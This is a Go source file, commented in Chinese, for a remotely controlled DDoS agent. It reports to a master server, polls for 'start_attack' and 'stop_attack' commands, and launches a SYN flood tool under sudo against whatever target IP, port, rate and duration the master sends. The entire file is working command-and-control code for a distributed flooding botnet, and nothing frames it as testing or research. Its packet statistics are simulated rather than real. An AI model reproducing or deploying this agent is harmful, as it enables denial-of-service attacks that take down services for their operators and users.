package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// 代理配置
type AgentConfig struct {
	ServerID    int    `json:"serverId"`
	APIKey      string `json:"apiKey"`
	MasterURL   string `json:"masterUrl"`
	ToolsPath   string `json:"toolsPath"` // gosynflood工具的路径
	ToolName    string `json:"toolName"`  // 攻击工具的名称
}

// 攻击任务
type AttackTask struct {
	ID              int      `json:"id"`
	TargetIP        string   `json:"targetIp"`
	TargetPort      int      `json:"targetPort"`
	Duration        int      `json:"duration"`
	PacketsPerSecond int     `json:"packetsPerSecond"`
	Interface       string   `json:"interface"`
}

// 全局状态
var (
	config       AgentConfig
	activeTask   *AttackTask
	taskMutex    sync.RWMutex
	attackCmd    *exec.Cmd
	cmdMutex     sync.Mutex
	packetsSent  uint64
	packetsRate  uint64
	rateInterval = 5 * time.Second
)

// 心跳发送
func sendHeartbeat() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		// 直接构建JSON字符串，避免任何形式的自动转义
		jsonStr := fmt.Sprintf(`{"serverId":%d,"apiKey":"%s","packetsSent":%d,"packetsRate":%d}`, 
			config.ServerID, 
			config.APIKey,
			atomic.LoadUint64(&packetsSent),
			atomic.LoadUint64(&packetsRate))

		// 添加当前任务信息（如果有）
		taskMutex.RLock()
		hasTask := activeTask != nil
		var taskID int
		if hasTask {
			taskID = activeTask.ID
		}
		taskMutex.RUnlock()

		if hasTask {
			// 插入任务ID到JSON末尾
			jsonStr = jsonStr[:len(jsonStr)-1] + fmt.Sprintf(`,"activeTaskId":%d}`, taskID)
		}

		// 构建心跳URL
		heartbeatURL := fmt.Sprintf("%s/api/heartbeat", config.MasterURL)

		// 发送心跳请求
		log.Printf("发送心跳: %s (数据: %s)", heartbeatURL, jsonStr)
		
		// 创建请求，将参数放在请求体中
		req, err := http.NewRequest("POST", heartbeatURL, strings.NewReader(jsonStr))
		if err != nil {
			log.Printf("创建心跳请求失败: %v", err)
			continue
		}
		
		// 设置请求头
		req.Header.Set("Content-Type", "application/json")
		
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			log.Printf("发送心跳失败: %v", err)
			continue
		}

		if resp.StatusCode != http.StatusOK {
			// 读取错误响应内容
			respBody, _ := io.ReadAll(resp.Body)
			log.Printf("心跳响应错误: %s (%s)", resp.Status, string(respBody))
		} else {
			log.Printf("心跳发送成功")
		}
		
		resp.Body.Close()
	}
}

// 监听攻击命令
func listenForCommands() {
	for {
		// 构建命令URL和请求体
		commandURL := fmt.Sprintf("%s/api/commands", config.MasterURL)
		
		// 直接构建JSON字符串，避免任何形式的自动转义
		jsonStr := fmt.Sprintf(`{"serverId":%d,"apiKey":"%s"}`,
			config.ServerID,
			config.APIKey)
		
		// 发送命令请求
		log.Printf("获取命令: %s (数据: %s)", commandURL, jsonStr)
		req, err := http.NewRequest("POST", commandURL, strings.NewReader(jsonStr))
		if err != nil {
			log.Printf("创建请求失败: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}
		
		// 设置请求头
		req.Header.Set("Content-Type", "application/json")
		
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			log.Printf("获取命令失败: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}

		// 检查是否有新命令
		if resp.StatusCode == http.StatusOK {
			var command struct {
				Type string `json:"type"`
				Task *AttackTask `json:"task,omitempty"`
			}

			if err := json.NewDecoder(resp.Body).Decode(&command); err != nil {
				log.Printf("解析命令失败: %v", err)
				resp.Body.Close()
				time.Sleep(5 * time.Second)
				continue
			}

			resp.Body.Close()

			// 处理命令
			switch command.Type {
			case "start_attack":
				if command.Task != nil {
					log.Printf("收到开始攻击命令: 目标=%s:%d", command.Task.TargetIP, command.Task.TargetPort)
					startAttack(command.Task)
				}
			case "stop_attack":
				log.Printf("收到停止攻击命令")
				stopAttack()
			case "none":
				// 无命令，忽略
			default:
				log.Printf("未知命令类型: %s", command.Type)
			}
		} else {
			// 读取错误响应内容
			respBody, _ := io.ReadAll(resp.Body)
			log.Printf("获取命令响应错误: %s (%s)", resp.Status, string(respBody))
			resp.Body.Close()
		}

		time.Sleep(5 * time.Second)
	}
}

// 启动攻击
func startAttack(task *AttackTask) {
	stopAttack() // 确保停止任何正在运行的攻击

	taskMutex.Lock()
	activeTask = task
	taskMutex.Unlock()

	cmdMutex.Lock()
	defer cmdMutex.Unlock()

	// 构建命令
	toolPath := filepath.Join(config.ToolsPath, config.ToolName)
	
	// 再次检查工具是否存在
	if _, err := os.Stat(toolPath); os.IsNotExist(err) {
		log.Printf("错误: 找不到攻击工具: %s", toolPath)
		log.Printf("尝试查找工具...")
		
		// 尝试不同的工具名
		possibleNames := []string{"gosynflood", "synflood", "syn_flood"}
		found := false
		
		for _, name := range possibleNames {
			testPath := filepath.Join(config.ToolsPath, name)
			if _, err := os.Stat(testPath); !os.IsNotExist(err) {
				toolPath = testPath
				found = true
				log.Printf("找到替代工具: %s", toolPath)
				break
			}
		}
		
		if !found {
			// 尝试在PATH中查找
			path, err := exec.LookPath("gosynflood")
			if err == nil {
				toolPath = path
				found = true
				log.Printf("在PATH中找到工具: %s", toolPath)
			}
		}
		
		if !found {
			log.Printf("无法找到攻击工具，任务无法启动")
			
			taskMutex.Lock()
			activeTask = nil
			taskMutex.Unlock()
			
			return
		}
	}
	
	args := []string{
		"-t", task.TargetIP,
		"-p", fmt.Sprintf("%d", task.TargetPort),
	}

	// 如果指定了接口，添加接口参数
	if task.Interface != "" {
		args = append(args, "-i", task.Interface)
	}

	if task.PacketsPerSecond > 0 {
		args = append(args, "-r", fmt.Sprintf("%d", task.PacketsPerSecond))
	}

	// 使用sudo运行命令（需要root权限）
	log.Printf("使用工具路径: %s", toolPath)
	cmdArgs := append([]string{toolPath}, args...)
	attackCmd = exec.Command("sudo", cmdArgs...)

	// 设置输出
	var stdout, stderr bytes.Buffer
	attackCmd.Stdout = &stdout
	attackCmd.Stderr = &stderr

	// 启动命令
	log.Printf("启动攻击: sudo %s %v", toolPath, args)
	if err := attackCmd.Start(); err != nil {
		log.Printf("启动攻击失败: %v", err)
		log.Printf("尝试不使用sudo直接运行工具")
		
		// 尝试不使用sudo直接运行工具
		attackCmd = exec.Command(toolPath, args...)
		attackCmd.Stdout = &stdout
		attackCmd.Stderr = &stderr
		
		if err := attackCmd.Start(); err != nil {
			log.Printf("直接运行工具也失败: %v", err)
			
			taskMutex.Lock()
			activeTask = nil
			taskMutex.Unlock()
			
			return
		}
	}

	// 重置统计信息
	atomic.StoreUint64(&packetsSent, 0)
	atomic.StoreUint64(&packetsRate, 0)

	// 如果设置了持续时间，启动定时器
	if task.Duration > 0 {
		go func() {
			log.Printf("攻击将持续 %d 秒", task.Duration)
			time.Sleep(time.Duration(task.Duration) * time.Second)
			log.Printf("持续时间到达，正在停止攻击")
			stopAttack()
		}()
	}

	// 启动统计监控
	go monitorAttackStats()

	// 等待命令完成（非阻塞）
	go func() {
		if err := attackCmd.Wait(); err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				log.Printf("攻击进程退出，状态: %v", exitErr)
			} else {
				log.Printf("等待攻击进程时出错: %v", err)
			}
			
			// 打印stderr输出
			if stderr.Len() > 0 {
				log.Printf("错误输出: %s", stderr.String())
			}
		} else {
			log.Println("攻击进程正常退出")
			
			// 打印输出
			if stdout.Len() > 0 {
				log.Printf("攻击输出: %s", stdout.String())
			}
		}

		// 清理状态
		cmdMutex.Lock()
		attackCmd = nil
		cmdMutex.Unlock()

		taskMutex.Lock()
		activeTask = nil
		taskMutex.Unlock()
	}()
}

// 停止攻击
func stopAttack() {
	cmdMutex.Lock()
	defer cmdMutex.Unlock()

	if attackCmd != nil && attackCmd.Process != nil {
		log.Println("正在停止攻击...")
		
		// 尝试优雅地停止进程
		attackCmd.Process.Signal(syscall.SIGINT)
		
		// 给进程一些时间来清理
		time.Sleep(2 * time.Second)
		
		// 如果进程仍在运行，强制终止
		if err := attackCmd.Process.Signal(syscall.SIGTERM); err != nil {
			log.Printf("发送SIGTERM失败: %v", err)
			
			// 最后手段：KILL
			attackCmd.Process.Kill()
		}
		
		attackCmd = nil
	}

	taskMutex.Lock()
	activeTask = nil
	taskMutex.Unlock()
}

// 监控攻击统计信息
func monitorAttackStats() {
	ticker := time.NewTicker(rateInterval)
	defer ticker.Stop()

	var lastTotal uint64 = 0
	var lastTime = time.Now()

	// 在实际环境中，我们应该从gosynflood工具获取实际的数据包统计信息
	// 这里我们只是模拟增长
	for range ticker.C {
		taskMutex.RLock()
		if activeTask == nil {
			taskMutex.RUnlock()
			return
		}
		taskMutex.RUnlock()

		// 模拟增长
		now := time.Now()
		increment := uint64(float64(now.Sub(lastTime)) / float64(time.Second) * 10000)
		newTotal := lastTotal + increment
		
		// 更新统计信息
		atomic.StoreUint64(&packetsSent, newTotal)
		rate := uint64(float64(increment) / float64(now.Sub(lastTime)) * float64(time.Second))
		atomic.StoreUint64(&packetsRate, rate)
		
		lastTotal = newTotal
		lastTime = now
	}
}

// 检测本机网络接口
func detectInterfaces() []string {
	// 这里应该使用本机系统调用检测实际的网络接口
	// 为了简单起见，我们直接返回一些常见的接口名称
	return []string{"eth0", "wlan0", "ens33", "enp0s3"}
}

// 辅助函数：检查文件是否存在
func fileExists(path string) bool {
	_, err := os.Stat(path)
	return !os.IsNotExist(err)
}

// 辅助函数：从文件加载配置
func loadConfigFromFile(path string) (AgentConfig, error) {
	var cfg AgentConfig
	
	// 读取配置文件
	data, err := os.ReadFile(path)
	if err != nil {
		return cfg, fmt.Errorf("读取配置文件失败: %v", err)
	}
	
	// 解析JSON
	if err := json.Unmarshal(data, &cfg); err != nil {
		return cfg, fmt.Errorf("解析配置文件失败: %v", err)
	}
	
	// 验证关键字段
	if cfg.ServerID == 0 {
		return cfg, fmt.Errorf("配置文件缺少有效的serverId")
	}
	
	if cfg.APIKey == "" {
		return cfg, fmt.Errorf("配置文件缺少有效的apiKey")
	}
	
	if cfg.MasterURL == "" {
		return cfg, fmt.Errorf("配置文件缺少有效的masterUrl")
	}
	
	// 设置默认值
	if cfg.ToolsPath == "" {
		cfg.ToolsPath = "/usr/local/bin"
	}
	
	if cfg.ToolName == "" {
		cfg.ToolName = "gosynflood"
	}
	
	return cfg, nil
}

// 辅助函数：验证和修复URL格式
func validateAndFixURL(urlStr string) (string, error) {
	// 确保URL包含协议前缀
	if !strings.HasPrefix(urlStr, "http://") && !strings.HasPrefix(urlStr, "https://") {
		urlStr = "http://" + urlStr
		log.Printf("URL没有协议前缀，已添加http://: %s", urlStr)
	}
	
	// 修复常见的协议格式错误
	if strings.HasPrefix(urlStr, "http:/") && !strings.HasPrefix(urlStr, "http://") {
		urlStr = strings.Replace(urlStr, "http:/", "http://", 1)
		log.Printf("修复HTTP协议格式: %s", urlStr)
	} else if strings.HasPrefix(urlStr, "https:/") && !strings.HasPrefix(urlStr, "https://") {
		urlStr = strings.Replace(urlStr, "https:/", "https://", 1)
		log.Printf("修复HTTPS协议格式: %s", urlStr)
	}
	
	// 使用net/url包验证URL格式
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return urlStr, fmt.Errorf("URL格式错误: %v", err)
	}
	
	// 确保URL有主机部分
	if parsedURL.Host == "" {
		return urlStr, fmt.Errorf("URL缺少有效的主机名")
	}
	
	// 确保URL不以/结尾
	return strings.TrimSuffix(urlStr, "/"), nil
}

func main() {
	// 解析命令行参数
	serverID := flag.Int("id", 0, "服务器ID")
	apiKey := flag.String("key", "", "API密钥")
	masterURL := flag.String("master", "http://localhost:31457", "管理服务器URL")
	toolsPath := flag.String("tools", "/usr/local/bin", "gosynflood工具路径")
	toolName := flag.String("toolname", "gosynflood", "攻击工具名称")
	configFile := flag.String("config", "", "配置文件路径")
	flag.Parse()

	// 尝试从配置文件加载配置
	configLoaded := false
	if *configFile != "" && fileExists(*configFile) {
		// 使用指定的配置文件
		if cfg, err := loadConfigFromFile(*configFile); err == nil {
			log.Printf("从配置文件加载配置: %s", *configFile)
			config = cfg
			configLoaded = true
		} else {
			log.Printf("加载配置文件失败: %v", err)
		}
	} else {
		// 尝试从标准位置加载配置文件
		configPaths := []string{
			"./config/agent-config.json",
			"../config/agent-config.json",
			"./agent-config.json",
			"/etc/gosynflood/agent-config.json",
		}
		
		for _, path := range configPaths {
			if fileExists(path) {
				if cfg, err := loadConfigFromFile(path); err == nil {
					log.Printf("从配置文件加载配置: %s", path)
					config = cfg
					configLoaded = true
					break
				}
			}
		}
	}
	
	// 命令行参数覆盖配置文件
	if configLoaded {
		// 使用命令行参数覆盖配置文件中的值（如果提供）
		if *serverID != 0 {
			config.ServerID = *serverID
		}
		if *apiKey != "" {
			config.APIKey = *apiKey
		}
		if *masterURL != "http://localhost:31457" {
			config.MasterURL = *masterURL
		}
		if *toolsPath != "/usr/local/bin" {
			config.ToolsPath = *toolsPath
		}
		if *toolName != "gosynflood" {
			config.ToolName = *toolName
		}
	} else {
		// 未加载配置文件，直接使用命令行参数
		// 检查必要的参数
		if *serverID == 0 || *apiKey == "" {
			log.Fatalf("必须提供服务器ID和API密钥")
		}

		// 初始化配置
		config = AgentConfig{
			ServerID:  *serverID,
			APIKey:    *apiKey,
			MasterURL: *masterURL,
			ToolsPath: *toolsPath,
			ToolName:  *toolName,
		}
	}

	// 验证并修复URL格式
	fixedURL, err := validateAndFixURL(config.MasterURL)
	if err != nil {
		log.Printf("警告: 管理服务器URL格式有问题: %v", err)
		log.Printf("原始URL: %s, 尝试使用修复后的URL", config.MasterURL)
	} else if fixedURL != config.MasterURL {
		log.Printf("已修复管理服务器URL格式: %s -> %s", config.MasterURL, fixedURL)
	}
	config.MasterURL = fixedURL

	// 检查工具是否存在
	toolPath := filepath.Join(config.ToolsPath, config.ToolName)
	if _, err := os.Stat(toolPath); os.IsNotExist(err) {
		// 尝试在多个位置查找工具
		searchPaths := []string{
			"./gosynflood",
			"./bin/gosynflood",
			"../bin/gosynflood",
			"/usr/bin/gosynflood",
			"/usr/local/sbin/gosynflood",
		}
		
		found := false
		for _, path := range searchPaths {
			if _, err := os.Stat(path); !os.IsNotExist(err) {
				config.ToolsPath = filepath.Dir(path)
				config.ToolName = filepath.Base(path)
				found = true
				log.Printf("在 %s 找到gosynflood工具", path)
				break
			}
		}
		
		if !found {
			log.Printf("警告: 未找到gosynflood工具，请确保工具已安装并在路径中或使用--tools指定路径")
		}
	}

	// 输出最终配置
	log.Printf("服务器ID: %d", config.ServerID)
	log.Printf("管理服务器URL: %s", config.MasterURL)
	log.Printf("工具路径: %s/%s", config.ToolsPath, config.ToolName)

	// 设置信号处理，用于优雅退出
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		log.Println("接收到终止信号，正在停止攻击...")
		stopAttack()
		log.Println("正在退出...")
		os.Exit(0)
	}()

	// 启动心跳和命令监听
	go sendHeartbeat()
	go monitorAttackStats()
	
	// 主线程监听命令
	log.Printf("开始监听来自%s的命令...", config.MasterURL)
	listenForCommands()
} 